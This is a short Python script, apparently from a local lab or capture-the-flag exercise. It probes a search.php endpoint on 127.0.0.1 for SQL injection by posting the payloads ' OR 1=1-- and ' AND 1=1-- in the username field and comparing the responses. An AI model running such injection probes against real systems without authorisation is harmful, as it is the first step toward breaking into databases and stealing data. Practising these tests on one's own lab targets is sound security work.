import requests
import time

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

print("Test 1: Normal request")
try:
    r = requests.post(URL, data={"username": "test"}, cookies=COOKIES, timeout=5)
    print(f"  Status: {r.status_code}")
    print(f"  Length: {len(r.text)}")
    print(f"  Sample: {r.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(1)

print("\nTest 2: SQLi OR 1=1")
try:
    r = requests.post(URL, data={"username": "' OR 1=1-- "}, cookies=COOKIES, timeout=5)
    print(f"  Status: {r.status_code}")
    print(f"  Length: {len(r.text)}")
    print(f"  Sample: {r.text[:100]}")
except Exception as e:
    print(f"  Error: {e}")

time.sleep(1)

print("\nTest 3: Character test")
try:
    r = requests.post(URL, data={"username": "' AND 1=1-- "}, cookies=COOKIES, timeout=5)
    print(f"  Status: {r.status_code}")
    print(f"  Length: {len(r.text)}")
except Exception as e:
    print(f"  Error: {e}")

print("\nComplete!")

